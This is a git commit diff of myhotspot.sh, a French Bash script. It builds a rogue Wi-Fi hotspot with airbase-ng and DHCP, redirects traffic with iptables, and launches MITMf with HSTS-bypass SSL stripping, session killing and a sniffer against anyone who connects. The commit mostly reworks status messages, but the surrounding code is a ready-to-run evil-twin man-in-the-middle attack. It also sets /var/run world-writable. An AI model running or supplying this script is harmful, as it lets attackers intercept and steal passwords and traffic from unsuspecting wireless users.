2adf131f57ea8e7f259e10bfa9526db05ffc5ed8
Enzo <Nyzo@users.noreply.github.com>
2015-04-20 11:43:48 +0200

    Update myhotspot.sh
    Amélioration de la rapidité, ajout de paramètres dans MITMf, implémentation de MITMf dans la console et modifications des couleurs.

--- myhotspot.sh
+++ myhotspot.sh
@@ -18,21 +18,23 @@ init_fn() {
 #Vérification des installations
 #DHCP
 if [[ ! -x /usr/sbin/dhcpd ]];then
-  echo -e "$warn\nVous devez installer isc-dhcp-server"
+  echo -e "$info\n[$warn✘$info] isc-dhcp-server n'est pas installé !"
   sleep 1
-  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)"
+  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n) $txtrst"
   read var
   if [[ $var == y ]];then
     apt-get install isc-dhcp-server
   else
     exit_fn
   fi
+else
+echo -e "$info\n[$q✔$info] isc-dhcp-server installé"
 fi
 #MITMf
 if [[ ! -x /etc/MITMf ]];then
-  echo -e "$warn\nVous devez installer MITMf"
+  echo -e "$info\n[$warn✘$info] MITMf n'est pas installé !"
   sleep 1
-  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)"
+  echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)$txtrst"
   read var
   if [[ $var == y ]];then
     cd /etc
@@ -41,18 +43,25 @@ if [[ ! -x /etc/MITMf ]];then
     cd MITMf
     pip install -r requirements.txt
     ./setup.sh
+    sleep 1
+    echo -e "$info\n[$q✔$info] Installation terminée$txtrst"
   else
     exit_fn
   fi
 else
+  echo -e "$info[$q✔$info] MITMf installé"
+  sleep 1
+  echo -e "$info\n[$q+$info] Mise à jour de MITMf$txtrst"
   cd /etc/MITMf
   ./update.sh
   cd /etc/myHotspot
+  echo -e "$info[$q✔$info] Mise à jour de MITMf terminée"
 fi
 
 #Mise à jour
-echo 'Mise à jour de myHotspot'
+echo -e "$info\n[$q+$info] Mise à jour de myHotspot$txtrst"
 git pull
+echo -e "$info[$q✔$info] Mise à jour de myHotspot terminée$txtrst"
 
 # Initialisation
 echo
@@ -80,7 +89,7 @@ setup_fn() {
 
 trap exit_fn INT
 
-# Création de la configuration DHCPD
+# Création de la configuration DHCP
 mkdir -p "/pentest/wireless/myhotspot"
 echo "authoritative;
 
@@ -99,13 +108,13 @@ range 10.0.0.20 10.0.0.50;
 }" > /pentest/wireless/myhotspot/dhcpd.conf
 
 # Création du point d'accès wifi
-echo -e "$info\n[+]Configuration du point d'accès wifi $warn"
-xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & fakeapid=$!
+echo -e "$info\n[$q+$info] Configuration du point d'accès wifi $warn"
+xterm -xrm '*hold: true' -geometry 75x15+1+0 -T "myHotspot - $ESSID - $fakeap - $fakeap_interface" -e airbase-ng --essid "$ESSID" -c 1 $fakeap_interface & airbaseid=$!
 disown
 sleep 3
 
 # Tables
-echo -e "$info\n[+]Configurations des tables et des redirections $warn"
+echo -e "$info\n[$q+$info] Configurations des tables et des redirections $warn"
 ifconfig lo up
 ifconfig at0 up &
 sleep 1
@@ -126,28 +135,31 @@ iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --t
 sleep 3
 
 # DHCP
-echo -e "$info\n[+]Configuration et démarrage DHCP $warn"
+echo -e "$info\n[$q+$info] Configuration et démarrage DHCP$txtrst"
+sleep 2
 chmod 777 /var/run/
 touch /var/run/dhcpd.pid
 chmod 777 /var/run/dhcpd.pid
 chown dhcpd:dhcpd /var/run/dhcpd.pid
-xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dchpid=$!
+xterm -xrm '*hold: true' -geometry 75x20+1+240 -T DHCP -e dhcpd -f -d -cf "/pentest/wireless/myhotspot/dhcpd.conf" at0 & dhcpdid=$!
 disown
-sleep 3
+sleep 1
 
-# SSLStrip
-echo -e "$info\n[+]Configuration et démarrage de MITMf $txtrst"
+# MITMf
+echo -e "$info\n[$q+$info] Configuration et démarrage de MITMf $warn"
 cd /etc/MITMf
-xterm -xrm '*hold: true' -geometry 100x25+1+400 -T MITMf -e python mitmf.py -i at0 --hsts --sniffer -a & mitmfid=$!
-disown
+echo -e "$txtrst"
+python mitmf.py -i at0 --hsts -f -k --sniffer -a & mitmfid=$!
 cd /etc/myHotspot
+sleep 4
 
+#Finalisation
 clear
-echo -e "$info\n[+]Initialistion terminée $txtrst\n"
+echo -e "$info[$q✔$info] Initialistion terminée $txtrst\n"
 echo "> Si vous n'avez pas aperçu d'erreur(s), le script est fonctionnel et vous devriez voir apparaître le wifi que vous avez créé"
 echo -e "$txtrst>$warn IMPORTANT$txtrst: Pour quitter, pressez q ou appuyez sur Ctrl+C, sinon vous pourriez obtenir des erreurs et des dysfonctionnements. $txtrst\n"
 read QUIT
-if [ $QUIT = "q" ] ; then
+if [ $QUIT == "q" ] ; then
 exit_fn
 else
 read QUIT
@@ -156,32 +168,31 @@ fi
 
 # Nettoyage
 exit_fn() {
-echo -e "$info\n[+] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux."
-
-echo -e "$info\n[+] Airbase-ng (fake ap) stoppé $warn"
-kill ${fakeapid}
-echo -e "$info[+] DHCP stoppé $warn"
-kill ${dchpid}
-sleep 1
-
-echo -e "$info[+] Airmon-ng stoppé $txtrst\n"
+echo -e "$info\n[$q+$info] Arrêt des processus et réinitialisation des protocoles, interfaces et réseaux.$warn\n"
+kill ${airbaseid}
+echo -e "$info\n[$q✔$info] Airbase-ng (fake ap) stoppé $warn\n"
+kill ${dhcpdid}
+echo -e "$info[$q✔$info] DHCP stoppé $warn\n"
+kill ${mitmfid}
+echo -e "$info[$q✔$info] MITMf stoppé $warn"
 sleep 1
 echo "0" > /proc/sys/net/ipv4/ip_forward
 iptables -F
 iptables -F -t nat
 iptables --delete-chain
 iptables -t nat --delete-chain
-echo -e "$info[+] iptables restaurée $txtrst\n"
+echo -e "$info[$q✔$info] iptables restaurée $txtrst\n"
 sleep 1
 airmon-ng stop $fakeap_interface
 airmon-ng stop $fakeap
+echo -e "$info[$q✔$info] Airmon-ng stoppé $txtrst\n"
 sleep 1
 echo
 ifconfig $internet_interface up
 /etc/init.d/networking stop && /etc/init.d/networking start
-echo -e "$info\n[+] Redémarrage du système internet"
-echo "[+] Nettoyage et restauration terminé !"
-echo "[+] Merci d'utiliser myHotspot et à bientôt !"
+echo -e "$info\n[$q✔$info] Redémarrage du système internet"
+echo -e "[$q✔$info] Nettoyage et restauration terminé !"
+echo -e "[$q+$info] Merci d'utiliser myHotspot et à bientôt !"
 echo -e -n "\e[0m" #Réinitialisation du texte
 sleep 3
 clear
